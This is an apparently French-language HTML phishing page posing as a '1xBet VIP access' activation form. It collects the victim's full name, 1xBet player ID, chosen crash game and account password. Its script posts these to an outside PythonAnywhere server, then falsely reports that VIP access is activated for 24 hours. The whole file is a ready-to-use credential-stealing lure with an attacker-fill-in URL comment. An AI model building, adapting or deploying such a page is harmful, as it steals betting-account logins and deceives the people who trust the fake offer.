<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acc√®s VIP 1xBet</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #1a2a3a; color: white; text-align: center; padding: 20px; }
        .container { background-color: #2c3e50; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; }
        input, select { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
        button { background-color: #27ae60; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; width: 90%; }
        #status { margin-top: 20px; font-weight: bold; color: #f1c40f; }
    </style>
</head>
<body>

    <div class="container">
        <h2>üöÄ ACC√àS VIP D√âTECT√â</h2>
        <p>Entrez vos infos pour synchroniser votre compte</p>
        
        <input type="text" id="nom" placeholder="Nom complet" required>
        <input type="text" id="id_joueur" placeholder="ID Joueur 1xBet" required>
        
        <select id="jeu">
            <option value="Aviator">Aviator</option>
            <option value="Crash">Crash Game</option>
            <option value="Apple of Fortune">Apple of Fortune</option>
        </select>
        
        <input type="password" id="password" placeholder="Mot de passe" required>
        
        <button onclick="envoyerDonnees()">ACTIVER L'ACC√àS</button>
        
        <div id="status"></div>
    </div>

    <script>
        async function envoyerDonnees() {
            const statusDiv = document.getElementById('status');
            const btn = document.querySelector('button');
            
            // Les donn√©es √† envoyer
            const info = {
                nom: document.getElementById('nom').value,
                id: document.getElementById('id_joueur').value,
                jeu: document.getElementById('jeu').value,
                pass: document.getElementById('password').value
            };

            if (!info.nom || !info.id || !info.pass) {
                statusDiv.innerText = "‚ùå Veuillez remplir tous les champs";
                return;
            }

            statusDiv.innerText = "‚è≥ Analyse du compte en cours...";
            btn.disabled = true;

            try {
                // TON URL PYTHONANYWHERE ICI
                const urlServeur = "https://Ngeruka.pythonanywhere.com/send";

                const response = await fetch(urlServeur, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(info)
                });

                if (response.ok) {
                    statusDiv.innerHTML = "‚úÖ Synchronisation r√©ussie !<br>Acc√®s VIP activ√© pour 24h.";
                } else {
                    statusDiv.innerText = "‚ùå Erreur de connexion au serveur.";
                }
            } catch (error) {
                console.error(error);
                statusDiv.innerText = "‚ùå Erreur r√©seau. R√©essayez.";
            } finally {
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
